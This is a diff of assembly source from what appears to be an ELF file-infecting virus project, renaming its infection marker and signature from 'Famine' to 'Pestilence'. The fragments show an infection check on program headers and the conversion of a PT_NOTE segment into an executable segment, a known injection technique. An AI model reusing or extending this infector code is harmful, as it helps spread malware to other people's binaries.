@@ -89,7 +89,7 @@ endstruc
 %define PF_X 0x1
 %define PF_R 0x4
 ; used to check if the file has been infected
-%define PF_FAMINE 0x8
+%define PF_PESTILENCE 0x8
 
 section .text
 
@@ -630,12 +630,12 @@ has_signature:
 		imul rcx, rsi				; 		...
 		add rax, rcx				; 		...
 
-		; check if PT_FAMINE
-		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_FAMINE))
+		; check if PF_PESTILENCE
+		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_PESTILENCE))
 		add rdi, elf64_phdr.p_flags		; ...
 		mov eax, [rdi]				; ...
-		and eax, PF_FAMINE			; ...
-		cmp eax, PF_FAMINE			; ...
+		and eax, PF_PESTILENCE			; ...
+		cmp eax, PF_PESTILENCE			; ...
 		jne .next_phdr_loop			; 	goto next_phdr_loop;
 
 		jmp .found				; goto found;
@@ -703,7 +703,7 @@ convert_pt_note_to_load:
 
 	mov rdi, rax					; _flags_ptr = _note_segment->p_flags;
 	add rdi, elf64_phdr.p_flags			; ...
-	mov DWORD [rdi], PF_X | PF_R | PF_FAMINE	; *_flags_ptr = PF_X | PF_R | PF_FAMINE;
+	mov DWORD [rdi], PF_X | PF_R | PF_PESTILENCE	; *_flags_ptr = PF_X | PF_R | PF_PESTILENCE;
 
 	mov rdi, rax					; _offset_ptr = _note_segment->p_offset;
 	add rdi, elf64_phdr.p_offset			; ...
@@ -756,6 +756,6 @@ section .data
 	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 	len_elf_64_magic: equ $ - elf_64_magic
 	; never used but here to be copied in the binary
-	signature: db "Famine v1.0 by jmaia and dhubleur"
+	signature: db "Pestilence v1.0 by jmaia and dhubleur"
 
 _end:
